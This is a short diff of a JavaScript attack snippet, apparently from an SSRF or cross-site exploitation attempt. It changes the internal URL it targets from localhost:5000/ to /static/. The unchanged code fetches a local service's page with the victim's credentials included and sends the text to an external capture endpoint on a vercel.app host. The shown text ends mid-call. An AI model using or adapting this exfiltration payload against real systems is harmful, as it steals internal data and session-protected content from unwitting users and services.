@@ -9,7 +9,7 @@
 (async () => {
   try {
     // Fetch HTML from localhost:5000
-    const res = await fetch('http://localhost:5000/', {credentials: 'include'});
+    const res = await fetch('http://localhost:5000/static/', {credentials: 'include'});
     const text = await res.text();
     // Send it to your capture endpoint
     await fetch('https://ssrf-eta.vercel.app/api/capture', {
